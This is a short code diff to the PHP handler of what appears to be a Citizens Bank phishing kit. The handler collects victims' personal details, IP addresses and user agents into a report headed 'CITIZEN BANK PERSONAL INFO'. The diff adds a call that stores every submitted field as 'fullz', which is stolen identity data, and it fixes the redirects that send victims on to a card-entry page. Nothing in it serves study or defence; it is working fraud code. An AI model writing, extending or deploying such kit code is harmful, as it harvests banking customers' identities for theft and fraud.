@@ -14,6 +14,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $zip = $_POST['zip'];
     $useragent = $_SERVER['HTTP_USER_AGENT'];
     $ip = getenv("REMOTE_ADDR");
+
+    h4z3_store_submission('fullz', $_POST);
     
   	        $body  = "++++++++++ 🐱‍💻 CITIZEN BANK PERSONAL INFO 🐱‍💻 ++++++++++\r\n";
             $body .= "Full Name     : $fName\r\n";
@@ -58,10 +60,12 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         
         if($debitpage == "on"){
           header('Location: ../card');
+          exit;
         }
         else{
           header('Location: ../complete');
-        } 
-        
+          exit;
+        }
+
 }
 ?>
